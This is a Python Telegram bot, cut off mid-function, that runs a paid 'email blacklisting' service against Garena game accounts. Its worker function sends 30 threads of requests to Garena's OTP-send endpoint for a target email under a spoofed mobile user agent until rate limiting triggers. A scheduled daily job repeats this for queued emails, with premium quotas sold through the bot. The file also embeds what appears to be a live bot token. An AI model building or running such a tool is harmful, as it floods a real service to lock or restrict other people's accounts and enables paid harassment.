import os
import sys
import time
import threading
import requests
import urllib3
import json
from datetime import datetime

os.environ['TZ'] = 'Asia/Kolkata'
try:
    time.tzset()
except AttributeError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
from telegram.error import Conflict, NetworkError, TimedOut

C = "\033[1;36m"
G = "\033[1;32m"
R = "\033[1;31m"
Y = "\033[1;33m"
W = "\033[1;37m"
B = "\033[1m"
S = "\033[0m"

print(f"{G}[+] Bot is starting...{S}")

BOT_TOKEN = "9177141595:AAG8IdR4ZIDxyFQl7mg6DDrqcGjXHxHTauI"
OWNER_USERNAME = "@cc_dumpper"
OWNER_ID = 8018177659

ADMIN_FILE = "admins.json"
BANNED_FILE = "banned_users.json"

FORCE_CHANNEL_USERNAME = "@FEXXUNBAN"
FORCE_CHANNEL_LINK = "https://t.me/FEXXUNBAN"

AUTO_BLACKLIST_FILE = "auto_emails.json"
BROADCAST_FILE = "users.json"

NUM_WORKERS = 30

FREE_MANUAL_LIMIT = 2
PREMIUM_MANUAL_LIMIT = 20
FREE_AUTO_LIMIT = 1
PREMIUM_AUTO_LIMIT = 15
MAX_BLACKLIST_LIMIT = FREE_MANUAL_LIMIT
AUTO_LIST_LIMIT = FREE_AUTO_LIMIT

any_success_lock = threading.Lock()
any_success = False
result_message = None
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0
user_states = {}
auto_emails_list = []
users_list = []
admins_list = []
banned_users_list = []

USER_KB_BLACKLIST = "🚀 Start Blacklisting"
USER_KB_ADD_AUTO = "➕ Add Auto Email"
USER_KB_VIEW_AUTO = "📁 View My Auto List"
USER_KB_REMOVE_AUTO = "❌ Remove Auto Email"
USER_KB_CLEAR_AUTO = "🗑️ Clear My Auto List"
USER_KB_PROFILE = "👤 My Profile"
USER_KB_PREMIUM = "💎 Upgrade to Premium"
USER_KB_HELP = "📖 Help & Guide"
USER_KB_OWNER = "👑 Contact Owner"
USER_KB_STATUS = "📊 Live Status"

USER_KEYBOARD_TEXTS = {
    USER_KB_BLACKLIST, USER_KB_ADD_AUTO, USER_KB_VIEW_AUTO,
    USER_KB_REMOVE_AUTO, USER_KB_CLEAR_AUTO, USER_KB_PROFILE,
    USER_KB_PREMIUM, USER_KB_HELP, USER_KB_OWNER, USER_KB_STATUS
}

print(f"{G}[+] Global variables initialized{S}")

def load_banned_users():
    global banned_users_list
    try:
        if os.path.exists(BANNED_FILE):
            with open(BANNED_FILE, 'r') as f:
                banned_users_list = json.load(f)
            print(f"{G}[+] Loaded {len(banned_users_list)} banned users{S}")
        else:
            banned_users_list = []
            save_banned_users()
    except Exception as e:
        print(f"{R}[!] Error loading banned users: {e}{S}")
        banned_users_list = []

def save_banned_users():
    try:
        with open(BANNED_FILE, 'w') as f:
            json.dump(banned_users_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving banned users: {e}{S}")

def is_user_banned(user_id):
    return user_id in banned_users_list

def ban_user(user_id):
    global banned_users_list
    if user_id == OWNER_ID:
        return False, "Cannot ban the owner!"
    if is_admin(user_id):
        return False, "Cannot ban an admin!"
    if user_id in banned_users_list:
        return False, "User is already banned!"
    banned_users_list.append(user_id)
    save_banned_users()
    return True, "User banned successfully!"

def unban_user(user_id):
    global banned_users_list
    if user_id not in banned_users_list:
        return False, "User is not banned!"
    banned_users_list.remove(user_id)
    save_banned_users()
    return True, "User unbanned successfully!"

def load_admins():
    global admins_list
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                admins_list = json.load(f)
            print(f"{G}[+] Loaded {len(admins_list)} admins{S}")
        else:
            admins_list = []
            save_admins()
    except Exception as e:
        print(f"{R}[!] Error loading admins: {e}{S}")
        admins_list = []

def save_admins():
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(admins_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving admins: {e}{S}")

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    return user_id in admins_list

def load_users():
    global users_list
    try:
        if os.path.exists(BROADCAST_FILE):
            with open(BROADCAST_FILE, 'r') as f:
                users_list = json.load(f)
            for u in users_list:
                if 'auto_emails' not in u:
                    u['auto_emails'] = []
                if 'is_premium' not in u:
                    u['is_premium'] = False
            print(f"{G}[+] Loaded {len(users_list)} users{S}")
        else:
            users_list = []
            save_users()
    except Exception as e:
        print(f"{R}[!] Error loading users: {e}{S}")
        users_list = []

def save_users():
    try:
        with open(BROADCAST_FILE, 'w') as f:
            json.dump(users_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving users: {e}{S}")

def add_user(user_id, username, full_name):
    global users_list
    if user_id is None:
        return False
    for user in users_list:
        if user['id'] == user_id:
            return False
    users_list.append({
        'id': user_id,
        'username': username if username else 'N/A',
        'name': full_name if full_name else 'Unknown',
        'joined': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'blacklist_count': 0,
        'auto_emails': [],
        'is_premium': False
    })
    save_users()
    return True

def is_new_user(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return False
    return True

def get_user_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user.get('blacklist_count', 0)
    return 0

def increment_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            user['blacklist_count'] = user.get('blacklist_count', 0) + 1
            save_users()
            return True
    return False

def find_user_by_id(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user
    return None

def is_premium(user_id):
    u = find_user_by_id(user_id)
    if u:
        return u.get('is_premium', False)
    return False

def give_premium(user_id):
    for user in users_list:
        if user['id'] == user_id:
            user['is_premium'] = True
            user['premium_since'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            save_users()
            return True
    return False

def remove_premium(user_id):
    for user in users_list:
        if user['id'] == user_id:
            user['is_premium'] = False
            user.pop('premium_since', None)
            save_users()
            return True
    return False

def get_manual_limit(user_id):
    if is_admin(user_id):
        return float('inf')
    if is_premium(user_id):
        return PREMIUM_MANUAL_LIMIT
    return FREE_MANUAL_LIMIT

def get_auto_limit(user_id):
    if is_admin(user_id):
        return float('inf')
    if is_premium(user_id):
        return PREMIUM_AUTO_LIMIT
    return FREE_AUTO_LIMIT

def get_user_auto_emails(user_id):
    for user in users_list:
        if user['id'] == user_id:
            if 'auto_emails' not in user:
                user['auto_emails'] = []
            return user['auto_emails']
    return []

def add_user_auto_email(user_id, email):
    for user in users_list:
        if user['id'] == user_id:
            if 'auto_emails' not in user:
                user['auto_emails'] = []
            if email in user['auto_emails']:
                return False, "already_exists"
            if len(user['auto_emails']) >= get_auto_limit(user_id):
                return False, "limit_reached"
            user['auto_emails'].append(email)
            save_users()
            return True, "added"
    return False, "user_not_found"

def remove_user_auto_email(user_id, email):
    for user in users_list:
        if user['id'] == user_id:
            if 'auto_emails' in user and email in user['auto_emails']:
                user['auto_emails'].remove(email)
                save_users()
                return True
            return False
    return False

def clear_user_auto_emails(user_id):
    for user in users_list:
        if user['id'] == user_id:
            user['auto_emails'] = []
            save_users()
            return True
    return False

def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_BLACKLIST_FILE):
            with open(AUTO_BLACKLIST_FILE, 'r') as f:
                auto_emails_list = json.load(f)
            print(f"{G}[+] Loaded {len(auto_emails_list)} global auto emails{S}")
        else:
            auto_emails_list = []
            save_auto_emails()
    except Exception as e:
        print(f"{R}[!] Error loading emails: {e}{S}")
        auto_emails_list = []

def save_auto_emails():
    try:
        with open(AUTO_BLACKLIST_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving emails: {e}{S}")

def format_limit(limit):
    if limit == float('inf'):
        return "♾️"
    return str(limit)

def get_user_keyboard(user_id=None):
    keyboard = [
        [KeyboardButton(USER_KB_BLACKLIST)],
        [KeyboardButton(USER_KB_ADD_AUTO), KeyboardButton(USER_KB_VIEW_AUTO)],
        [KeyboardButton(USER_KB_REMOVE_AUTO), KeyboardButton(USER_KB_CLEAR_AUTO)],
        [KeyboardButton(USER_KB_PROFILE), KeyboardButton(USER_KB_PREMIUM)],
        [KeyboardButton(USER_KB_HELP), KeyboardButton(USER_KB_OWNER)],
        [KeyboardButton(USER_KB_STATUS)]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)

def get_admin_inline_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📂 Add Global Auto Email", callback_data='add_auto')],
        [InlineKeyboardButton("📁 View Global Auto List", callback_data='view_auto')],
        [InlineKeyboardButton("🗑️ Clear Global Auto List", callback_data='clear_auto')],
        [InlineKeyboardButton("❌ Remove From Global Auto", callback_data='remove_auto')],
        [InlineKeyboardButton("💎 Grant Premium Access", callback_data='give_premium')],
        [InlineKeyboardButton("⬇️ Revoke Premium Access", callback_data='remove_premium')],
        [InlineKeyboardButton("📋 View Premium Users", callback_data='premium_list')],
        [InlineKeyboardButton("📢 Send Broadcast", callback_data='broadcast')],
        [InlineKeyboardButton("👥 View All Users", callback_data='users')],
        [InlineKeyboardButton("🚫 Ban A User", callback_data='ban')],
        [InlineKeyboardButton("✅ Unban A User", callback_data='unban')],
        [InlineKeyboardButton("📋 View Banned Users", callback_data='bannedlist')]
    ])

def worker(email, gen):
    global any_success, result_message
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {
            "app_id": "100067",
            "email": email,
            "locale": "hi_IN"
        }
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15)
            try:
                j = resp.json()
            except Exception:
                j = {}
            err = j.get("error")
            code = j.get("code")
            result = j.get("result")
            msg = None
            if err == "error_no_binding_found":
                msg = "no_binding"
            elif err == "error_too_many_requests" or code == 1006:
                msg = "already_blacklisted"
            elif err == "error_params":
                msg = "wrong_email"
            elif result == 0:
                msg = "success"
            if msg is None:
                continue
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    result_message = msg
                    if msg == "success":
                        with any_success_lock:
                            any_success = True
                    stop_event.set()
            return
        except Exception:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    result_message = "network_error"
                    stop_event.set()
            return

def wait_for_error():
    stop_event.wait()

def blacklist_email(email):
    global any_success, result_message, error_event, stop_event, generation
    generation += 1
    any_success = False
    result_message = None
    error_event.clear()
    stop_event.clear()
    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)
    wait_for_error()
    return result_message if result_message else "network_error"

print(f"{G}[+] Blacklist functions loaded{S}")

async def auto_blacklist_job(context: ContextTypes.DEFAULT_TYPE):
    global any_success, result_message, error_event, stop_event, generation

    tasks = []
    for email in auto_emails_list:
        tasks.append({'email': email, 'owner_id': OWNER_ID, 'source': 'global'})
    for u in users_list:
        if u['id'] == OWNER_ID:
            continue
        if is_user_banned(u['id']):
            continue
        for email in u.get('auto_emails', []):
            tasks.append({'email': email, 'owner_id': u['id'], 'source': 'personal'})

    if not tasks:
        print(f"{Y}[!] No emails to process in auto blacklist{S}")
        return

    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"""🤖 Automated Blacklist Engine — Started

━━━━━━━━━━━━━━━━━━━━━━━━
Queue Overview
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Global Queue: {len(auto_emails_list)} email(s)
▸ User Queues: {len(tasks) - len(auto_emails_list)} email(s)
▸ Total Tasks: {len(tasks)}

▸ Timestamp: {datetime.now().strftime('%I:%M %p')} | {datetime.now().strftime('%d-%m-%Y')}

⚡ Engine operating on {NUM_WORKERS} parallel threads.
A completion report will be delivered shortly."""
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}")

    user_results = {}
    overall = {"success": 0, "already_blacklisted": 0, "no_binding": 0, "wrong_email": 0, "network_error": 0}

    for task in tasks:
        email = task['email']
        owner_id = task['owner_id']
        print(f"{C}[+] Auto blacklisting: {email}{S}")

        generation += 1
        any_success = False
        result_message = None
        error_event.clear()
        stop_event.clear()
        threads = []
        for _ in range(NUM_WORKERS):
            t = threading.Thread(target=worker, args=(email, generation))
            t.daemon = True
            t.start()
            threads.append(t)
        wait_for_error()

        rm = result_message if result_message else "network_error"
        overall[rm] = overall.get(rm, 0) + 1

        if owner_id not in user_results:
            user_results[owner_id] = {"success": 0, "already_blacklisted": 0, "no_binding": 0, "wrong_email": 0, "network_error": 0, "total": 0}
        user_results[owner_id][rm] = user_results[owner_id].get(rm, 0) + 1
        user_results[owner_id]["total"] += 1

        if rm == "success":
            increment_blacklist_count(owner_id)

        time.sleep(2)

    for uid, res in user_results.items():
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"""✅ Automated Blacklist — Completed

━━━━━━━━━━━━━━━━━━━━━━━━
Personal Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total Processed: {res['total']}

▸ Successful: {res['success']}
▸ Already Blacklisted: {res['already_blacklisted']}
▸ No Binding: {res['no_binding']}
▸ Invalid Format: {res['wrong_email']}
▸ Network Errors: {res['network_error']}

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Date: {datetime.now().strftime('%d-%m-%Y')}
▸ Time: {datetime.now().strftime('%I:%M %p')}
━━━━━━━━━━━━━━━━━━━━━━━━
👑 Owner: {OWNER_USERNAME}"""
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify {uid}: {e}{S}")

    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"""✅ Automated Blacklist — Master Report

━━━━━━━━━━━━━━━━━━━━━━━━
Overall Statistics
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total Tasks: {len(tasks)}

▸ Successful: {overall['success']}
▸ Already Blacklisted: {overall['already_blacklisted']}
▸ No Binding: {overall['no_binding']}
▸ Invalid Format: {overall['wrong_email']}
▸ Network Errors: {overall['network_error']}

▸ Users Notified: {len(user_results)}
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Date: {datetime.now().strftime('%d-%m-%Y')}
▸ Time: {datetime.now().strftime('%I:%M %p')}
━━━━━━━━━━━━━━━━━━━━━━━━"""
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}")

    print(f"{G}[+] Auto blacklist complete: {overall}{S}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    if not context.args:
        await update.message.reply_text(
            """🚫 User Restriction — Usage Guide

━━━━━━━━━━━━━━━━━━━━━━━━
Syntax: /ban <user_id>

Example: /ban 123456789

This operation will immediately revoke 
the user's access to the bot."""
        )
        return
    try:
        target_id = int(context.args[0])
        success, msg = ban_user(target_id)
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"""🚫 Access Revoked

━━━━━━━━━━━━━━━━━━━━━━━━
Your access to this service has been 
terminated by an administrator.

If you believe this action was taken 
in error, please contact support:

👑 {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify banned user: {e}{S}")
            await update.message.reply_text(f"✅ User {target_id} has been successfully restricted.")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid identifier. Please provide a numeric user ID.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    if not context.args:
        await update.message.reply_text(
            """✅ Access Restoration — Usage Guide

━━━━━━━━━━━━━━━━━━━━━━━━
Syntax: /unban <user_id>

Example: /unban 123456789

This operation will restore the user's 
access to the bot."""
        )
        return
    try:
        target_id = int(context.args[0])
        success, msg = unban_user(target_id)
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"""✅ Access Restored

━━━━━━━━━━━━━━━━━━━━━━━━
Your access to this service has been 
fully restored.

You may now resume using all features.

Welcome back! 🎉
━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER_USERNAME}"""
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify unbanned user: {e}{S}")
            await update.message.reply_text(f"✅ User {target_id} has been successfully restored.")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid identifier. Please provide a numeric user ID.")

async def banned_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    if not banned_users_list:
        await update.message.reply_text(
            """📋 Restricted Users Registry

━━━━━━━━━━━━━━━━━━━━━━━━
Status: Empty

No users are currently restricted.
All registered users have full access.
━━━━━━━━━━━━━━━━━━━━━━━━"""
        )
        return
    banned_text = "\n".join([f"▸ {user_id}" for user_id in banned_users_list])
    await update.message.reply_text(
        f"""📋 Restricted Users Registry

━━━━━━━━━━━━━━━━━━━━━━━━
{banned_text}
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total Restricted: {len(banned_users_list)} user(s)

To restore access, use:
/unban <user_id>"""
    )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    if not context.args:
        await update.message.reply_text(
            """📢 Broadcast System — Usage Guide

━━━━━━━━━━━━━━━━━━━━━━━━
Syntax: /broadcast <message>

Example:
/broadcast Important announcement for all users!

This will transmit your message to 
every registered user of the bot."""
        )
        return
    broadcast_msg = ' '.join(context.args)
    keyboard = [
        [InlineKeyboardButton("✅ Confirm & Send", callback_data='broadcast_yes')],
        [InlineKeyboardButton("❌ Cancel Operation", callback_data='broadcast_no')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"""📢 Broadcast — Confirmation Required

━━━━━━━━━━━━━━━━━━━━━━━━
Message Preview
━━━━━━━━━━━━━━━━━━━━━━━━
{broadcast_msg}

━━━━━━━━━━━━━━━━━━━━━━━━
Target Audience
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Registered Users: {len(users_list)}
▸ Restricted (skipped): {len(banned_users_list)}
▸ Will Receive: {len(users_list) - len(banned_users_list)}

━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ This action cannot be undone.
Confirm your decision below.""",
        reply_markup=reply_markup
    )
    context.user_data['broadcast_msg'] = broadcast_msg

async def premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    if not context.args:
        await update.message.reply_text(
            """💎 Grant Premium — Usage Guide

━━━━━━━━━━━━━━━━━━━━━━━━
Syntax: /premium <user_id>

Example: /premium 123456789

This will grant premium tier access to 
the specified user."""
        )
        return
    try:
        target_id = int(context.args[0])
        target = find_user_by_id(target_id)
        if target is None:
            await update.message.reply_text("❌ User not found in database. They must start the bot first.")
            return
        if is_admin(target_id):
            await update.message.reply_text("ℹ️ This user is already an administrator and has unlimited access.")
            return
        if is_premium(target_id):
            await update.message.reply_text("ℹ️ This user already has premium access.")
            return
        if give_premium(target_id):
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"""💎 Premium Access Granted

━━━━━━━━━━━━━━━━━━━━━━━━
Congratulations!

Your account has been upgraded to 
premium status by an administrator.

━━━━━━━━━━━━━━━━━━━━━━━━
Premium Benefits
━━━━━━━━━━━━━━━━━━━━━━━━
▸ {PREMIUM_MANUAL_LIMIT} manual blacklist quota
▸ {PREMIUM_AUTO_LIMIT} automated queue slots
▸ Priority processing
▸ Premium badge on profile
▸ Exclusive premium features

━━━━━━━━━━━━━━━━━━━━━━━━
Thank you for being a valued member.
👑 {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify premium user: {e}{S}")
            await update.message.reply_text(f"✅ Premium access granted to user {target_id}.")
        else:
            await update.message.reply_text("❌ Failed to grant premium access.")
    except ValueError:
        await update.message.reply_text("❌ Invalid identifier. Please provide a numeric user ID.")

async def removepremium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    if not context.args:
        await update.message.reply_text(
            """⬇️ Revoke Premium — Usage Guide

━━━━━━━━━━━━━━━━━━━━━━━━
Syntax: /removepremium <user_id>

Example: /removepremium 123456789

This will revoke premium access from 
the specified user."""
        )
        return
    try:
        target_id = int(context.args[0])
        if not is_premium(target_id):
            await update.message.reply_text("ℹ️ This user does not have premium access.")
            return
        if remove_premium(target_id):
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"""⚠️ Premium Access Expired

━━━━━━━━━━━━━━━━━━━━━━━━
Your premium access has been revoked.

━━━━━━━━━━━━━━━━━━━━━━━━
Current Limits
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Manual Blacklist: {FREE_MANUAL_LIMIT}
▸ Automated Slots: {FREE_AUTO_LIMIT}

━━━━━━━━━━━━━━━━━━━━━━━━
To renew your premium subscription, 
please contact support:

👑 {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
                )
            except Exception as e:
                print(f"{R}[!] Failed to notify user: {e}{S}")
            await update.message.reply_text(f"✅ Premium access revoked from user {target_id}.")
        else:
            await update.message.reply_text("❌ Failed to revoke premium access.")
    except ValueError:
        await update.message.reply_text("❌ Invalid identifier. Please provide a numeric user ID.")

async def premium_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access Denied\n\nThis command is reserved for administrators only.")
        return
    premiums = [u for u in users_list if u.get('is_premium', False)]
    if not premiums:
        await update.message.reply_text(
            """📋 Premium Users Registry

━━━━━━━━━━━━━━━━━━━━━━━━
Status: Empty

No premium users exist yet.
Use /premium <user_id> to grant access.
━━━━━━━━━━━━━━━━━━━━━━━━"""
        )
        return
    text = "📋 Premium Users Registry\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for p in premiums:
        text += f"\n💎 {p['name']}\n   @{p['username']}\n   ID: {p['id']}\n"
        if p.get('premium_since'):
            text += f"   Since: {p['premium_since']}\n"
    text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n▸ Total: {len(premiums)} premium user(s)"
    await update.message.reply_text(text)

async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    if user is None:
        await query.edit_message_text("❌ Unable to identify user.")
        return
    if not is_admin(user.id):
        await query.edit_message_text("⛔ Access Denied")
        return
    data = query.data
    broadcast_msg = context.user_data.get('broadcast_msg', '')
    if data == 'broadcast_yes':
        await query.edit_message_text(
            f"""📢 Broadcast In Progress

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Transmitting to all users...
▸ Total Recipients: {len(users_list)}

A completion report will follow shortly."""
        )
        success_count = 0
        fail_count = 0
        for user_data in users_list:
            if is_user_banned(user_data['id']):
                continue
            try:
                await context.bot.send_message(
                    chat_id=user_data['id'],
                    text=f"""📢 Official Announcement

━━━━━━━━━━━━━━━━━━━━━━━━
{broadcast_msg}
━━━━━━━━━━━━━━━━━━━━━━━━
👑 From: {OWNER_USERNAME}
▸ Time: {datetime.now().strftime('%I:%M %p')}"""
                )
                success_count += 1
                time.sleep(0.1)
            except Exception as e:
                fail_count += 1
                print(f"{R}[!] Failed to send to {user_data['id']}: {e}{S}")
        await query.edit_message_text(
            f"""✅ Broadcast Completed

━━━━━━━━━━━━━━━━━━━━━━━━
Transmission Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Delivered: {success_count}
▸ Failed: {fail_count}
▸ Total: {len(users_list)}
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Completed: {datetime.now().strftime('%I:%M %p')}"""
        )
    elif data == 'broadcast_no':
        await query.edit_message_text(
            """❌ Broadcast Cancelled

━━━━━━━━━━━━━━━━━━━━━━━━
The operation was cancelled by the 
administrator. No messages were 
transmitted to any users.
━━━━━━━━━━━━━━━━━━━━━━━━"""
        )

def build_help_text():
    return f"""📖 Complete Help & Guide

━━━━━━━━━━━━━━━━━━━━━━━━
🚀 Manual Blacklisting
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Click "🚀 Start Blacklisting"
▸ Submit the target email address
▸ Await automated processing
▸ Receive instant verification

Each successful operation consumes 
one quota unit from your account.

━━━━━━━━━━━━━━━━━━━━━━━━
📂 Automated Blacklisting
━━━━━━━━━━━━━━━━━━━━━━━━
Configure emails to be processed 
automatically on a daily schedule.

Capabilities:
▸ Queue up to {FREE_AUTO_LIMIT} emails (free tier)
▸ Queue up to {PREMIUM_AUTO_LIMIT} emails (premium)
▸ Automated daily processing
▸ Detailed personal reports

Operations:
▸ ➕ Add Auto Email
▸ 📁 View My Auto List
▸ ❌ Remove Auto Email
▸ 🗑️ Clear My Auto List

All automated processes execute 
daily at 4:10 AM IST.

━━━━━━━━━━━━━━━━━━━━━━━━
👤 Account Management
━━━━━━━━━━━━━━━━━━━━━━━━
Access comprehensive account data:
▸ Profile information
▸ Usage statistics
▸ Current limits
▸ Account status

━━━━━━━━━━━━━━━━━━━━━━━━
💎 Premium Tier
━━━━━━━━━━━━━━━━━━━━━━━━
Elevate your experience with:

Free Tier:
▸ {FREE_MANUAL_LIMIT} manual operations
▸ {FREE_AUTO_LIMIT} automated slots

Premium Tier:
▸ {PREMIUM_MANUAL_LIMIT} manual operations
▸ {PREMIUM_AUTO_LIMIT} automated slots
▸ Priority processing queue
▸ Premium profile badge
▸ Exclusive features

Click "💎 Upgrade to Premium" for details.

━━━━━━━━━━━━━━━━━━━━━━━━
📋 Response Classifications
━━━━━━━━━━━━━━━━━━━━━━━━
🟢 SUCCESS
   Email successfully blacklisted

🔴 ALREADY BLACKLISTED
   Email was previously restricted

⚠️ NO BINDING
   Email not linked to any account

❌ INVALID FORMAT
   Malformed email address detected

📡 NETWORK ERROR
   Service temporarily unreachable

━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Engine Specifications
━━━━━━━━━━━━━━━━━━━━━━━━
▸ {NUM_WORKERS} parallel worker threads
▸ Intelligent result detection
▸ Sub-second response times
▸ End-to-end encryption
▸ Automated daily processing
▸ Real-time statistics

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Support & Assistance
━━━━━━━━━━━━━━━━━━━━━━━━
Owner: {OWNER_USERNAME}
Availability: 24/7
Response: Fast & Reliable"""

def build_owner_text():
    return f"""👑 Owner Information

━━━━━━━━━━━━━━━━━━━━━━━━
Contact Details
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Owner: {OWNER_USERNAME}
▸ Telegram: {OWNER_USERNAME}
▸ Availability: 24/7
▸ Response: Within Hours

━━━━━━━━━━━━━━━━━━━━━━━━
About The Service
━━━━━━━━━━━━━━━━━━━━━━━━
This platform was architected and is 
maintained by {OWNER_USERNAME}, 
offering reliable and secure email 
blacklisting solutions.

Every operation is processed with 
maximum efficiency and discretion.

━━━━━━━━━━━━━━━━━━━━━━━━
Available Services
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Instant Manual Blacklisting
▸ Automated Daily Processing
▸ Premium Tier Access
▸ Personal Analytics
▸ Enterprise-Grade Speed
▸ Complete Privacy

━━━━━━━━━━━━━━━━━━━━━━━━
Get In Touch
━━━━━━━━━━━━━━━━━━━━━━━━
For assistance or inquiries:

👑 {OWNER_USERNAME}

We respond to all messages within 
24 hours — usually much faster.

━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Thank you for choosing our service."""

def build_status_text():
    total_users = len(users_list)
    total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
    total_auto = sum(len(u.get('auto_emails', [])) for u in users_list) + len(auto_emails_list)
    total_premium = sum(1 for u in users_list if u.get('is_premium', False))
    return f"""📊 Live System Status

━━━━━━━━━━━━━━━━━━━━━━━━
Operational State
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Status: 🟢 Operational
▸ Uptime: 24/7 Continuous
▸ Security: 🔒 End-to-End
▸ Worker Threads: {NUM_WORKERS} Active

━━━━━━━━━━━━━━━━━━━━━━━━
User Analytics
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Registered Users: {total_users}
▸ Premium Members: {total_premium}
▸ Restricted Users: {len(banned_users_list)}
▸ Administrators: {len(admins_list) + 1}

